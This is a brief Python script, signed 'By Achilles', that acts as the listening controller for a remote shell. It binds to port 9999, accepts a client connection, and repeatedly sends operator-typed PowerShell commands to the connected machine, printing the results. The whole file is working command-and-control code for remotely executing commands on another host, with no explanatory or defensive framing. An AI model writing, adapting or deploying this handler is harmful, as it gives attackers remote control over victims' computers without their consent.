import socket
import subprocess
#By Achilles
server_address = ('0.0.0.0', 9999)
#By Achilles
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#By Achilles
server_socket.bind(server_address)
#By Achilles
server_socket.listen(1)
#By Achilles
print("Server is listening for connections...")
#By Achilles
client_socket, client_address = server_socket.accept()
#By Achilles
while True:
    command = input("Enter a PowerShell command to execute on the client (or 'exit' to quit): ")
    client_socket.send(command.encode())
#By Achilles
    if command.lower() == 'exit':
        break
    response = client_socket.recv(1024).decode()
    print("Response from client:")
    print(response)
#By Achilles
client_socket.close()
server_socket.close()
